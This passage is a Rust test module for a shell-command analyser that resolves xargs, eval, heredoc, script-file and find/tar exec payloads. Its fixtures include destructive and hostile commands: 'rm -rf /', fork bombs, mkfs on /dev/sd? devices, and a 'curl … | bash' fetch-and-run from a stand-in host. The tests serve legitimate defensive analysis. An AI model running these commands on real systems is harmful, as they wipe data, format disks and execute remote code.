                .execution_unit_resolve_records()
                .iter()
                .filter(|r| r.origin_kind == ExecutionUnitOriginKind::StaticXargs)
            {
                let command = &record.parsed_scope.commands[record.command_ref.command_index];
                assert!(command.conditional_execution);
                let runtime = command
                    .tokens
                    .iter()
                    .filter(|t| t.implicit_input_source.is_some())
                    .collect::<Vec<_>>();
                assert!(runtime.iter().all(|t| t.node_kind == "runtime_scalar"));
                assert!(runtime.iter().all(|t| t.implicit_input_source
                    == Some(caushell_types::ImplicitInputSource::StdinData)));
                assert!(runtime.iter().all(|t| matches!(
                    &t.runtime_argument_domain,
                    Some(caushell_types::RuntimeArgumentDomain::PathSet {
                        may_escape: false,
                        ..
                    })
                )));
                let ResolveInvocationArtifactResult::Resolved(resolved) = &record.result else {
                    panic!("{record:#?}")
                };
                assert_eq!(
                    resolved.bound.form_id.as_str(),
                    if runtime.len() < 2 {
                        "missing_operands"
                    } else {
                        "ordinary_file_copy"
                    }
                );
                if runtime.len() == 2 {
                    for slot in ["source_paths", "destination_path"] {
                        let value = resolved
                            .bound
                            .bound_parameters
                            .iter()
                            .find(|p| p.name.as_str() == slot)
                            .unwrap();
                        assert_eq!(value.values.len(), 1, "{resolved:#?}");
                        assert!(
                            matches!(&value.values[0], BoundValue::ImplicitInput { origin: Some(origin), .. } if origin.single_field)
                        );
                    }
                    assert_ne!(runtime[0].span, runtime[1].span);
                }
                counts.push(runtime.len());
            }
            counts.sort_unstable();
            assert_eq!(counts, expected, "{command}");
        }
    }

    #[test]
    fn xargs_bounded_arity_budget_keeps_unknown_tail_instead_of_partial_alternatives() {
        use super::{
            XargsDispatchMode, XargsItem, XargsItemMode, XargsStaticExpansionConfig,
            bounded_xargs_unknown_groups,
        };
        let mut config = XargsStaticExpansionConfig {
            item_mode: XargsItemMode::NullSeparated,
            dispatch_mode: XargsDispatchMode::MaxArgs { max_args: 2 },
            run_if_empty: true,
            decoding_proved: true,
            requires_confirmation: false,
            eof_marker: None,
            insert_batch_token: None,
        };
        let groups = vec![vec![], vec![XargsItem::UnknownTail]];
        let mut budget = 1;
        assert_eq!(
            bounded_xargs_unknown_groups(&config, groups.clone(), &mut budget),
            vec![
                vec![],
                vec![XargsItem::UnknownScalar],
                vec![XargsItem::UnknownScalar; 2]
            ]
        );
        assert_eq!(budget, 0);
        assert_eq!(
            bounded_xargs_unknown_groups(&config, groups.clone(), &mut budget),
            groups
        );
        budget = 32;
        config.dispatch_mode = XargsDispatchMode::MaxArgs { max_args: 9 };
        assert_eq!(
            bounded_xargs_unknown_groups(&config, groups.clone(), &mut budget),
            groups
        );
        assert_eq!(budget, 32);
        config.dispatch_mode = XargsDispatchMode::MaxLines { max_lines: 2 };
        config.item_mode = XargsItemMode::WhitespaceSeparated;
        assert_eq!(
            bounded_xargs_unknown_groups(&config, groups.clone(), &mut budget),
            groups
        );
        assert_eq!(budget, 32);
        config.item_mode = XargsItemMode::NullSeparated;
        assert_eq!(
            bounded_xargs_unknown_groups(&config, groups, &mut budget).len(),
            3
        );
        assert_eq!(budget, 31);
    }

    #[test]
    fn resolve_invocation_pass_records_static_xargs_max_lines_children() {
        let summary = SessionSummary::new();
        let ctx = run_pass(
            &summary,
            ShellKind::Bash,
            r#"printf 'safe\n/\n' | xargs -L 1 bash -lc 'rm -rf "$0"'"#,
        );

        let children: Vec<_> = ctx
            .execution_unit_resolve_records()
            .iter()
            .filter(|record| {
                record.origin_kind == caushell_runner::ExecutionUnitOriginKind::StaticXargs
            })
            .collect();

        assert_eq!(children.len(), 2);
        assert!(children.iter().any(|record| execution_record_has_argv(
            record,
            "bash",
            &["-lc", "rm -rf \"$0\"", "safe"]
        )));
        assert!(children.iter().any(|record| execution_record_has_argv(
            record,
            "bash",
            &["-lc", "rm -rf \"$0\"", "/"]
        )));
    }

    #[test]
    fn resolve_invocation_pass_records_static_xargs_max_lines_quoted_child() {
        let summary = SessionSummary::new();
        let ctx = run_pass(
            &summary,
            ShellKind::Bash,
            r#"printf "'/'\n" | xargs -L 1 rm -rf"#,
        );

        assert!(ctx.execution_unit_resolve_records().iter().any(|record| {
            record.origin_kind == caushell_runner::ExecutionUnitOriginKind::StaticXargs
                && execution_record_matches_fixture(record, "rm '-rf' '/'")
        }));
    }

    #[test]
    fn resolve_invocation_pass_records_static_xargs_empty_stdin_child_without_r() {
        let summary = SessionSummary::new();
        let ctx = run_pass(&summary, ShellKind::Bash, "printf '' | xargs rm -rf /");

        assert!(ctx.execution_unit_resolve_records().iter().any(|record| {
            record.origin_kind == caushell_runner::ExecutionUnitOriginKind::StaticXargs
                && execution_record_matches_fixture(record, "rm '-rf' '/'")
        }));
    }

    #[test]
    fn resolve_invocation_pass_models_possible_xargs_child_with_interactive_prompt() {
        let summary = SessionSummary::new();
        for command in [
            "printf '/\\n' | xargs -p rm -rf",
            "printf '/\\n' | xargs --interactive rm -rf",
        ] {
            let ctx = run_pass(&summary, ShellKind::Bash, command);

            assert!(ctx.execution_unit_resolve_records().iter().any(|record| {
                record.origin_kind == caushell_runner::ExecutionUnitOriginKind::StaticXargs
            }));
        }
    }

    #[test]
    fn resolve_invocation_pass_skips_static_xargs_empty_stdin_child_with_r() {
        let summary = SessionSummary::new();
        let ctx = run_pass(&summary, ShellKind::Bash, "printf '' | xargs -r rm -rf /");

        assert!(!ctx.execution_unit_resolve_records().iter().any(|record| {
            record.origin_kind == caushell_runner::ExecutionUnitOriginKind::StaticXargs
        }));
    }

    #[test]
    fn resolve_invocation_pass_records_static_xargs_child_from_cat_known_file() {
        let summary = SessionSummary::new();
        let graph = graph_with_known_payload_file(
            "/tmp/project/payload.txt",
            "printf '/\\n' > payload.txt",
            CommandSequenceNo::new(1),
        );
        let ctx = run_pass_with_session(
            graph,
            &summary,
            ShellKind::Bash,
            "cat payload.txt | xargs rm -rf",
        );

        assert!(ctx.execution_unit_resolve_records().iter().any(|record| {
            record.origin_kind == caushell_runner::ExecutionUnitOriginKind::StaticXargs
                && execution_record_matches_fixture(record, "rm '-rf' '/'")
        }));
    }

    #[test]
    fn resolve_invocation_pass_records_static_xargs_child_from_arg_file() {
        let summary = SessionSummary::new();
        let graph = graph_with_known_payload_file(
            "/tmp/project/payload.txt",
            "printf '/\\n' > payload.txt",
            CommandSequenceNo::new(1),
        );
        let ctx = run_pass_with_session(
            graph,
            &summary,
            ShellKind::Bash,
            "xargs -a payload.txt rm -rf",
        );

        assert!(ctx.execution_unit_resolve_records().iter().any(|record| {
            record.origin_kind == caushell_runner::ExecutionUnitOriginKind::StaticXargs
                && execution_record_matches_fixture(record, "rm '-rf' '/'")
        }));
    }

    #[test]
    fn resolve_invocation_pass_materializes_script_file_payload_from_prior_variable_write() {
        let mut summary = SessionSummary::new();
        summary.set_exact_scalar_variable(
            "PAYLOAD",
            "echo materialized",
            false,
            CommandSequenceNo::new(1),
        );
        let graph = graph_with_known_payload_file(
            "/tmp/project/script.sh",
            r#"printf "$PAYLOAD" > script.sh"#,
            CommandSequenceNo::new(1),
        );
        let ctx = run_pass_with_session(graph, &summary, ShellKind::Bash, "bash script.sh");

        let record = ctx
            .nested_payload_records()
            .iter()
            .find(|record| {
                record.candidate.candidate.source == caushell_profile::PayloadSource::ScriptFileRef
            })
            .expect("expected script-file nested payload");

        assert_eq!(
            record.candidate.candidate.origin,
            caushell_profile::RecursivePayloadOrigin::Parameter {
                slot: caushell_profile::SlotName::new("script_path"),
            }
        );
        assert_eq!(
            record.candidate.candidate.input,
            caushell_profile::RecursivePayloadInput::LiteralText {
                text: "echo materialized".to_string(),
            }
        );

        match &record.resolution {
            NestedPayloadResolution::Parsed { shell_kind, parsed } => {
                assert_eq!(*shell_kind, ShellKind::Bash);
                assert_eq!(parsed.commands.len(), 1);
                assert_eq!(parsed.commands[0].command_name.as_deref(), Some("echo"));
            }
            other => panic!("expected parsed script-file nested payload, got {other:?}"),
        }
    }

    #[test]
    fn resolve_invocation_pass_materializes_script_file_payload_from_same_request_write() {
        let summary = SessionSummary::new();
        let ctx = run_pass(
            &summary,
            ShellKind::Bash,
            "printf 'echo materialized' > script.sh; bash script.sh",
        );

        let record = ctx
            .nested_payload_records()
            .iter()
            .find(|record| {
                record.candidate.candidate.source == caushell_profile::PayloadSource::ScriptFileRef
            })
            .expect("expected script-file nested payload");

        assert_eq!(
            record.candidate.candidate.input,
            caushell_profile::RecursivePayloadInput::LiteralText {
                text: "echo materialized".to_string(),
            }
        );

        match &record.resolution {
            NestedPayloadResolution::Parsed { shell_kind, parsed } => {
                assert_eq!(*shell_kind, ShellKind::Bash);
                assert_eq!(parsed.commands.len(), 1);
                assert_eq!(parsed.commands[0].command_name.as_deref(), Some("echo"));
            }
            other => panic!("expected parsed script-file nested payload, got {other:?}"),
        }
    }

    #[test]
    fn resolve_invocation_pass_materializes_script_file_payload_from_same_request_variable_path() {
        let summary = SessionSummary::new();
        let ctx = run_pass(
            &summary,
            ShellKind::Bash,
            "SCRIPT=./generated.sh; printf 'echo materialized' > $SCRIPT; bash $SCRIPT",
        );

        let record = ctx
            .nested_payload_records()
            .iter()
            .find(|record| {
                record.candidate.candidate.source == caushell_profile::PayloadSource::ScriptFileRef
            })
            .expect("expected script-file nested payload");

        assert_eq!(
            record.candidate.candidate.input,
            caushell_profile::RecursivePayloadInput::LiteralText {
                text: "echo materialized".to_string(),
            }
        );

        match &record.resolution {
            NestedPayloadResolution::Parsed { shell_kind, parsed } => {
                assert_eq!(*shell_kind, ShellKind::Bash);
                assert_eq!(parsed.commands.len(), 1);
                assert_eq!(parsed.commands[0].command_name.as_deref(), Some("echo"));
            }
            other => panic!("expected parsed script-file nested payload, got {other:?}"),
        }
    }

    #[test]
    fn resolve_invocation_pass_materializes_script_file_payload_from_derived_shell_payload_path() {
        let summary = SessionSummary::new();
        let ctx = run_pass(
            &summary,
            ShellKind::Bash,
            r#"printf 'echo materialized' > script.sh; bash -c 'source "$1"' _ script.sh"#,
        );

        assert!(ctx.execution_unit_resolve_records().iter().any(|record| {
            record.origin_kind == caushell_runner::ExecutionUnitOriginKind::RecursivePayload
                && execution_record_matches_fixture(record, "echo materialized")
        }));
    }

    #[test]
    fn resolve_invocation_pass_materializes_script_file_payload_from_same_derived_scope_write() {
        let summary = SessionSummary::new();
        let ctx = run_pass(
            &summary,
            ShellKind::Bash,
            r#"bash -c 'printf "echo materialized" > script.sh; source script.sh'"#,
        );

        assert!(ctx.execution_unit_resolve_records().iter().any(|record| {
            record.origin_kind == caushell_runner::ExecutionUnitOriginKind::RecursivePayload
                && execution_record_matches_fixture(record, "echo materialized")
        }));
    }

    #[test]
    fn resolve_invocation_pass_materializes_bash_script_file_payload_from_same_derived_scope_write()
    {
        let summary = SessionSummary::new();
        let ctx = run_pass(
            &summary,
            ShellKind::Bash,
            r#"bash -c 'printf "echo materialized" > script.sh; bash script.sh'"#,
        );

        assert!(ctx.execution_unit_resolve_records().iter().any(|record| {
            record.origin_kind == caushell_runner::ExecutionUnitOriginKind::RecursivePayload
                && execution_record_matches_fixture(record, "echo materialized")
        }));
    }

    #[test]
    fn resolve_invocation_pass_materializes_tar_checkpoint_action_exec_payload() {
        let summary = SessionSummary::new();
        let ctx = run_pass(
            &summary,
            ShellKind::Bash,
            r#"tar cf /tmp/out.tar victim --checkpoint=1 --checkpoint-action=exec='sh -c "echo materialized"'"#,
        );

        assert!(ctx.execution_unit_resolve_records().iter().any(|record| {
            record.origin_kind == caushell_runner::ExecutionUnitOriginKind::Dispatch
                && execution_record_matches_fixture(
                    record,
                    r#"/bin/sh -c 'sh -c "echo materialized"'"#,
                )
        }));
        let inner = ctx
            .nested_payload_records()
            .iter()
            .find(|record| {
                matches!(&record.resolution, NestedPayloadResolution::Parsed {parsed, ..}
                if parsed.commands.iter().any(|c| c.command_name.as_deref() == Some("echo")))
            })
            .expect("expected inner sh -c nested payload");

        match &inner.resolution {
            NestedPayloadResolution::Parsed { shell_kind, parsed } => {
                assert_eq!(*shell_kind, ShellKind::Sh);
                assert!(
                    parsed
                        .commands
                        .iter()
                        .any(|command| command.command_name.as_deref() == Some("echo"))
                );
            }
            other => panic!("expected parsed inner sh -c payload, got {other:?}"),
        }
    }

    #[test]
    fn resolve_invocation_pass_materializes_sh_script_file_payload_from_same_derived_scope_write() {
        let summary = SessionSummary::new();
        let ctx = run_pass(
            &summary,
            ShellKind::Bash,
            r#"bash -c 'printf "echo materialized" > script.sh; sh script.sh'"#,
        );

        assert!(ctx.execution_unit_resolve_records().iter().any(|record| {
            record.origin_kind == caushell_runner::ExecutionUnitOriginKind::RecursivePayload
                && execution_record_matches_fixture(record, "echo materialized")
        }));
    }

    #[test]
    fn resolve_invocation_pass_materializes_static_pipeline_stdin_shell_payload() {
        let summary = SessionSummary::new();
        let ctx = run_pass(
            &summary,
            ShellKind::Bash,
            r#"printf 'echo materialized\n' | bash"#,
        );

        assert!(
            ctx.execution_unit_resolve_records()
                .iter()
                .any(|record| { execution_record_matches_fixture(record, "echo materialized") })
        );
    }

    #[test]
    fn resolve_invocation_pass_materializes_static_base64_decoded_stdin_shell_payload() {
        let summary = SessionSummary::new();
        let ctx = run_pass(
            &summary,
            ShellKind::Bash,
            "printf 'ZWNobyBtYXRlcmlhbGl6ZWQK' | base64 -d | sh",
        );

        assert!(
            ctx.execution_unit_resolve_records()
                .iter()
                .any(|record| { execution_record_matches_fixture(record, "echo materialized") })
        );
    }

    #[test]
    fn resolve_invocation_pass_materializes_static_pipeline_stdin_in_derived_shell_payload() {
        let summary = SessionSummary::new();
        let ctx = run_pass(
            &summary,
            ShellKind::Bash,
            r#"bash -c 'printf "echo materialized\n" | bash'"#,
        );

        assert!(
            ctx.execution_unit_resolve_records()
                .iter()
                .any(|record| { execution_record_matches_fixture(record, "echo materialized") })
        );
    }

    #[test]
    fn resolve_invocation_pass_materializes_static_file_stdin_shell_payload() {
        let summary = SessionSummary::new();
        let ctx = run_pass(
            &summary,
            ShellKind::Bash,
            r#"printf 'echo materialized\n' > script.sh; bash < script.sh"#,
        );

        assert!(
            ctx.execution_unit_resolve_records()
                .iter()
                .any(|record| { execution_record_matches_fixture(record, "echo materialized") })
        );
    }

    #[test]
    fn resolve_invocation_pass_materializes_unquoted_heredoc_shell_payload() {
        let summary = SessionSummary::new();
        let ctx = run_pass(
            &summary,
            ShellKind::Bash,
            "bash <<EOF\necho materialized\nEOF",
        );

        assert!(
            ctx.execution_unit_resolve_records()
                .iter()
                .any(|record| { execution_record_matches_fixture(record, "echo materialized") })
        );
    }

    #[test]
    fn resolve_invocation_pass_materializes_unquoted_heredoc_variable_shell_payload() {
        let summary = SessionSummary::new();
        let ctx = run_pass(
            &summary,
            ShellKind::Bash,
            "PAYLOAD='echo materialized'; bash <<EOF\n$PAYLOAD\nEOF",
        );

        assert!(
            ctx.execution_unit_resolve_records()
                .iter()
                .any(|record| { execution_record_matches_fixture(record, "echo materialized") })
        );
    }

    #[test]
    fn resolve_invocation_pass_materializes_unquoted_heredoc_command_substitution_payload() {
        let summary = SessionSummary::new();
        let ctx = run_pass(
            &summary,
            ShellKind::Bash,
            "bash <<EOF\n$(printf 'echo materialized')\nEOF",
        );

        assert!(
            ctx.execution_unit_resolve_records()
                .iter()
                .any(|record| { execution_record_matches_fixture(record, "echo materialized") })
        );
    }

    #[test]
    fn resolve_invocation_pass_materializes_unquoted_herestring_shell_payload() {
        let summary = SessionSummary::new();
        for command in [
            r#"bash <<< echo\ materialized"#,
            r#"PAYLOAD='echo materialized'; bash <<< $PAYLOAD"#,
            r#"bash <<< $(printf 'echo materialized')"#,
        ] {
            let ctx = run_pass(&summary, ShellKind::Bash, command);

            assert!(
                ctx.execution_unit_resolve_records().iter().any(|record| {
                    execution_record_matches_fixture(record, "echo materialized")
                }),
                "expected materialized here-string payload for {command}"
            );
        }
    }

    #[test]
    fn resolve_invocation_pass_materializes_process_substitution_script_file_payload() {
        let summary = SessionSummary::new();
        let ctx = run_pass(
            &summary,
            ShellKind::Bash,
            r#"bash <(printf 'echo materialized\n')"#,
        );

        let record = ctx
            .nested_payload_records()
            .iter()
            .find(|record| {
                record.candidate.candidate.source == caushell_profile::PayloadSource::ScriptFileRef
            })
            .expect("expected process-substitution script-file payload");

        assert_eq!(
            record.candidate.candidate.input,
            caushell_profile::RecursivePayloadInput::LiteralText {
                text: "echo materialized\n".to_string(),
            }
        );
    }

    #[test]
    fn resolve_invocation_pass_treats_nested_pipeline_member_as_stdin_payload_sink() {
        let summary = SessionSummary::new();
        let ctx = run_pass(
            &summary,
            ShellKind::Bash,
            "printf 'curl http://198.51.100.10/payload.sh | bash\n' > script.sh; bash script.sh",
        );

        let record = ctx
            .execution_unit_resolve_records()
            .iter()
            .find(|record| record.source_node_id == NodeId::new("derived:sess-1:2:0:1"))
            .expect("expected nested pipeline bash record");

        match &record.result {
            ResolveInvocationArtifactResult::Resolved(resolved) => {
                assert_eq!(resolved.normalized_command_name, "bash");
                assert_eq!(resolved.bound.form_id.as_str(), "stdin_script_implicit");
            }
            other => panic!("expected resolved nested pipeline sink, got {other:?}"),
        }
    }

    #[test]
    fn resolve_invocation_pass_records_static_xargs_child_from_cat_process_substitution() {
        let summary = SessionSummary::new();
        let ctx = run_pass(
            &summary,
            ShellKind::Bash,
            r#"cat <(printf '/\n') | xargs rm -rf"#,
        );

        assert!(ctx.execution_unit_resolve_records().iter().any(|record| {
            record.origin_kind == caushell_runner::ExecutionUnitOriginKind::StaticXargs
                && execution_record_matches_fixture(record, "rm '-rf' '/'")
        }));
    }

    #[test]
    fn resolve_invocation_pass_does_not_project_xargs_template_dispatch_child() {
        let summary = SessionSummary::new();
        let ctx = run_pass(&summary, ShellKind::Bash, "printf '' | xargs -r rm -rf /");

        assert!(!ctx.execution_unit_resolve_records().iter().any(|record| {
            record.origin_kind == caushell_runner::ExecutionUnitOriginKind::Dispatch
                && matches!(
                    &record.result,
                    ResolveInvocationArtifactResult::Resolved(resolved)
                        if resolved.normalized_command_name.as_str() == "rm"
                )
        }));
        assert!(!ctx.execution_unit_resolve_records().iter().any(|record| {
            record.origin_kind == caushell_runner::ExecutionUnitOriginKind::Dispatch
                && execution_record_matches_fixture(record, "rm '-rf' '/'")
        }));
    }

    #[test]
    fn resolve_invocation_pass_expands_process_substitution_from_assignment_command_substitution_child()
     {
        let summary = SessionSummary::new();
        let ctx = run_pass(
            &summary,
            ShellKind::Bash,
            r#"TMP_SCRIPT="$(cat <(printf 'echo nested'))""#,
        );

        let procsub = ctx
            .execution_unit_resolve_records()
            .iter()
            .find(|record| {
                record.origin_kind
                    == caushell_runner::ExecutionUnitOriginKind::ProcessSubstitutionBody
                    && execution_record_matches_fixture(record, "printf 'echo nested'")
            })
            .expect("expected process substitution body child");

        assert_eq!(
            procsub.parent_execution_node_id,
            NodeId::new("expanded-subst-assign:command:sess-1:2:0:0:0:0:0")
        );
        assert_eq!(procsub.root_command_index, 0);
    }

    #[test]
    fn resolve_invocation_pass_records_find_scope_on_nested_relocation_child() {
        let summary = SessionSummary::new();
        let ctx = run_pass(
            &summary,
            ShellKind::Bash,
            r#"find / -type f -exec sh -c 'mv "$1" /tmp/trash' sh {} \;"#,
        );

        let relocation = ctx
            .execution_unit_resolve_records()
            .iter()
            .find(|record| {
                record.origin_kind
                    == caushell_runner::ExecutionUnitOriginKind::ShellCommandStringPayload
                    && execution_record_has_runtime_path(record, "mv", 0, &["/"])
            })
            .expect("expected shell payload relocation child");

        let command = &relocation.parsed_scope.commands[relocation.command_ref.command_index];
        assert_eq!(command.tokens.len(), 2);
        assert_eq!(command.tokens[1].text, "/tmp/trash");
        assert!(execution_record_binds_runtime_path(relocation, &["/"]));

        assert_eq!(relocation.root_command_index, 0);
        assert!(
            relocation
                .inherited_scope
                .catastrophic_search_roots
                .iter()
                .any(|scope| scope.root == "/" && scope.via_command_name == "find")
        );
    }

    #[test]
    fn resolve_invocation_pass_records_find_block_device_scope_on_exec_child() {
        let summary = SessionSummary::new();
        let ctx = run_pass(
            &summary,
            ShellKind::Bash,
            r#"find /dev -maxdepth 1 -type b -name 'sd?' -exec mkfs.ext4 -F {} +"#,
        );

        let format_child = ctx
            .execution_unit_resolve_records()
            .iter()
            .find(|record| {
                record.origin_kind == caushell_runner::ExecutionUnitOriginKind::Dispatch
                    && matches!(
                        &record.result,
                        ResolveInvocationArtifactResult::Resolved(resolved)
                            if resolved.normalized_command_name.as_str() == "mkfs.ext4"
                    )
            })
            .expect("expected find -exec format child");

        assert_eq!(format_child.root_command_index, 0);
        assert!(
            format_child
                .inherited_scope
                .block_device_search_scopes
                .iter()
                .any(|scope| scope.target == "/dev/sd?" && scope.via_command_name == "find")
        );
    }

    #[test]
    fn resolve_invocation_pass_stages_shell_payload_expanded_derived_invocation() {
        let summary = SessionSummary::new();
        let ctx = run_pass(&summary, ShellKind::Bash, r#"bash -lc 'echo ok'"#);

        assert!(ctx.pending_mutations().iter().any(|mutation| matches!(
            mutation,
            PendingMutation::AddDerivedInvocation {
                node_id,
                origin,
                raw_text,
                parent_node_id,
                relation_from_parent,
                ..
            } if node_id.0 == "expanded-shell-payload:command:sess-1:2:0:0"
                && *origin == DerivedInvocationOrigin::ShellCommandStringPayload {
                    command_index: 0
                }
                && raw_text == "echo ok"
                && *parent_node_id == caushell_graph::NodeId::new("command:sess-1:2:0")
                && *relation_from_parent == caushell_graph::EdgeKind::ExpandsTo
        )));
    }

    #[test]
    fn resolve_invocation_pass_stages_truthful_process_substitution_derived_invocation() {
        let summary = SessionSummary::new();
        let ctx = run_pass(
            &summary,
            ShellKind::Bash,
            r#"printf 'echo ok' | xargs bash -c "cat <(printf 'echo nested')""#,
        );

        assert!(ctx.pending_mutations().iter().any(|mutation| matches!(
            mutation,
            PendingMutation::AddDerivedInvocation {
                node_id,
                origin,
                raw_text,
                parent_node_id,
                relation_from_parent,
                ..
            } if node_id.0
                == "expanded-procsub-body:expanded-shell-payload:expanded-xargs:pipeline-segment:sess-1:2:1:0:0:arg:0:0:0:0"
                && *origin == DerivedInvocationOrigin::ProcessSubstitutionBody {
                    parent_node_id:
                        "expanded-shell-payload:expanded-xargs:pipeline-segment:sess-1:2:1:0:0"
                            .to_string(),
                    location_kind: "argument".to_string(),
                    outer_index: 0,
                    location_subindex: 0,
                    substitution_index: 0,
                }
                && raw_text == "printf 'echo nested'"
                && *parent_node_id
                    == caushell_graph::NodeId::new(
                        "expanded-shell-payload:expanded-xargs:pipeline-segment:sess-1:2:1:0:0",
                    )
                && *relation_from_parent == caushell_graph::EdgeKind::DependsOn
        )));
    }

    #[test]
    fn resolve_invocation_pass_stages_nested_payload_mutation() {
        let summary = SessionSummary::new();
        let ctx = run_pass(&summary, ShellKind::Bash, r#"bash -c 'echo ok'"#);

        assert!(ctx.pending_mutations().iter().any(|mutation| matches!(
            mutation,
            PendingMutation::AddNestedPayload {
                node_id,
                record_id,
                depth,
                ..
            } if node_id.0 == "nested:sess-1:2:0" && *record_id == 0 && *depth == 1
        )));
    }

    #[test]
    fn resolve_invocation_pass_stages_derived_invocation_mutation() {
        let summary = SessionSummary::new();
        let ctx = run_pass(&summary, ShellKind::Bash, r#"bash -c 'echo ok'"#);

        assert!(ctx.pending_mutations().iter().any(|mutation| matches!(
            mutation,
            PendingMutation::AddDerivedInvocation {
                node_id,
                origin,
                derived_command_index,
                command_name,
                ..
            } if node_id.0 == "derived:sess-1:2:0:0"
                && *origin == DerivedInvocationOrigin::NestedPayload {
                    nested_record_id: 0
                }
                && *derived_command_index == 0
                && command_name.as_deref() == Some("echo")
        )));
    }

    #[test]
    fn resolve_invocation_pass_projects_eval_static_payload_into_parsed_nested_payload() {
        let summary = SessionSummary::new();
        let ctx = run_pass(&summary, ShellKind::Bash, r#"eval ':(){ :|:& };:'"#);

        assert_eq!(ctx.nested_payload_records().len(), 1);
        let record = &ctx.nested_payload_records()[0];

        assert_eq!(
            record.parent_ref,
            NestedPayloadParentRef::RootCommand { command_index: 0 }
        );
        assert_eq!(record.root_command_index, 0);
        assert_eq!(record.depth, 1);

        match &record.resolution {
            NestedPayloadResolution::Parsed { shell_kind, parsed } => {
                assert_eq!(*shell_kind, ShellKind::Bash);
                assert_eq!(parsed.commands.len(), 1);
                assert_eq!(parsed.commands[0].command_name.as_deref(), Some(":"));
            }
            other => panic!("expected parsed eval nested payload, got {other:?}"),
        }
    }

    #[test]
    fn resolve_invocation_pass_materializes_eval_payload_from_same_request_variable() {
        let summary = SessionSummary::new();
        let ctx = run_pass(
            &summary,
            ShellKind::Bash,
            r#"payload='f(){ f|f; }; f'; eval "$payload""#,
        );

        assert_eq!(ctx.nested_payload_records().len(), 1);
        let record = &ctx.nested_payload_records()[0];

        match &record.candidate.resolution {
            ValueMaterialization::ResolvedExactScalar {
                variable_name,
                value,
                ..
            } => {
                assert_eq!(variable_name, "payload");
                assert_eq!(value, "f(){ f|f; }; f");
            }
            other => panic!("expected exact-scalar eval payload materialization, got {other:?}"),
        }

        match &record.resolution {
            NestedPayloadResolution::Parsed { shell_kind, parsed } => {
                assert_eq!(*shell_kind, ShellKind::Bash);
                assert_eq!(parsed.commands.len(), 1);
                assert_eq!(parsed.commands[0].command_name.as_deref(), Some("f"));
            }
            other => panic!("expected parsed same-request eval payload, got {other:?}"),
        }
    }

    #[test]
    fn resolve_invocation_pass_materializes_nested_static_eval_payload() {
        let summary = SessionSummary::new();
        let ctx = run_pass(
            &summary,
            ShellKind::Bash,
            r#"payload='inner="f(){ f|f; }; f"; eval "$inner"'; eval "$payload""#,
        );

        assert_eq!(ctx.nested_payload_records().len(), 2);

        let outer = ctx
            .nested_payload_records()
            .iter()
            .find(|record| record.depth == 1)
            .expect("expected outer nested payload");
        let inner = ctx
            .nested_payload_records()
            .iter()
            .find(|record| record.depth == 2)
            .expect("expected inner nested payload");

        match &outer.resolution {
            NestedPayloadResolution::Parsed { shell_kind, parsed } => {
                assert_eq!(*shell_kind, ShellKind::Bash);
                assert!(
                    parsed
                        .commands
                        .iter()
                        .any(|command| command.command_name.as_deref() == Some("eval"))
                );
            }
            other => panic!("expected parsed outer eval payload, got {other:?}"),
        }

        match &inner.candidate.resolution {
            ValueMaterialization::ResolvedExactScalar {
                variable_name,
                value,
                ..
            } => {
                assert_eq!(variable_name, "inner");
                assert_eq!(value, "f(){ f|f; }; f");
            }
            other => panic!("expected exact-scalar nested eval payload, got {other:?}"),
        }

        match &inner.resolution {
            NestedPayloadResolution::Parsed { shell_kind, parsed } => {
                assert_eq!(*shell_kind, ShellKind::Bash);
                assert_eq!(parsed.commands.len(), 1);
                assert_eq!(parsed.commands[0].command_name.as_deref(), Some("f"));
            }
            other => panic!("expected parsed inner eval payload, got {other:?}"),
        }
    }

    #[test]
    fn resolve_invocation_pass_noops_when_parse_artifact_is_missing() {
        let summary = SessionSummary::new();
        let ctx = run_pass(&summary, ShellKind::Powershell, "Write-Host hello");

        assert_eq!(
            ctx.executed_passes,
            vec![
                "parse_command".to_string(),
                "project_top_level_commands".to_string(),
                "resolve_invocation".to_string()
            ]
        );
        assert!(ctx.parsed_command().is_none());
        assert!(ctx.execution_unit_resolve_records().is_empty());
    }
}
